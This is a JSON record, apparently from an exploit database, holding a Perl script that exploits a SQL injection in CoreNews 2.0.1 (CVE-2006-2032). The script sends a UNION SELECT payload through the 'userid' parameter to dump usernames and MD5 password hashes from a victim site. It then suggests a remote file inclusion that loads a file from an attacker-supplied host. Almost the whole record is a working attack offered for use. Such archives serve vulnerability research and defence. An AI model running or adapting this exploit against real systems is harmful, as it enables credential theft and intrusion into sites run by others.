{
  "id": "1704",
  "title": "CoreNews 2.0.1 - &#039;userid&#039; SQL Injection",
  "cve": "CVE-2006-2032",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Original advisory: http://www.nukedx.com/?viewdoc=24\r\n#Usage: corenews.pl <host> <path>\r\nuse IO::Socket;\r\nif(@ARGV != 2) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-24\\r\\n\";\r\n  print \"- CoreNews <= 2.0.1 Remote SQL Injection Exploit\\r\\n\";\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to CoreNews ex: /corenews/\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () \r\n{\r\n  #Our variables...\r\n  $cnserver = $ARGV[0];\r\n  $cnserver =~ s/(http:\\/\\/)//eg;\r\n  $cnhost   = \"http://\".$cnserver;\r\n  $cndir    = $ARGV[1];\r\n  $cnport   = \"80\";\r\n  $cntar    = \"preview.php?userid=\";\r\n  $cnxp     = \"-1/**/UNION/**/SELECT/**/null,concat(2022,login,20223,password,2203),null,null,null,null/**/FROM/**/corenews_users/*\";\r\n  $cnreq    = $cnhost.$cndir.$cntar.$cnxp;\r\n  #Sending data...\r\n  header();\r\n  print \"- Trying to connect: $cnserver\\r\\n\";\r\n  $cn = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$cnserver\", PeerPort => \"$cnport\") || die \"- Connection failed...\\n\";\r\n  print $cn \"GET $cnreq HTTP/1.1\\n\";\r\n  print $cn \"Accept: */*\\n\";\r\n  print $cn \"Referer: $cnhost\\n\";\r\n  print $cn \"Accept-Language: tr\\n\";\r\n  print $cn \"User-Agent: NukeZilla\\n\";\r\n  print $cn \"Cache-Control: no-cache\\n\";\r\n  print $cn \"Host: $cnserver\\n\";\r\n  print $cn \"Connection: close\\n\\n\";\r\n  print \"- Connected...\\r\\n\";\r\n  while ($answer = <$cn>) {\r\n    if ($answer =~ /2022(.*?)20223([\\d,a-f]{32})2203/) {\r\n      print \"- Exploit succeed!\\r\\n\";\r\n      print \"- Username: $1\\r\\n\";\r\n      print \"- MD5 HASH of PASSWORD: $2\\r\\n\";\r\n      print \"- If you crack hash you can use RFI with example ->\\r\\n\";\r\n      print \"- Example: $cnhost$cndir?show=http://yourhost.com/file.txt\\r\\n\"; \r\n      exit();\r\n    }\r\n  }\r\n  #Exploit failed...\r\n  print \"- Exploit failed\\n\"\r\n}\r\n\r\n# nukedx.com [2006-04-21]\r\n\r\n# milw0rm.com [2006-04-21]",
  "url": "https://www.exploit-db.com/exploits/1704"
}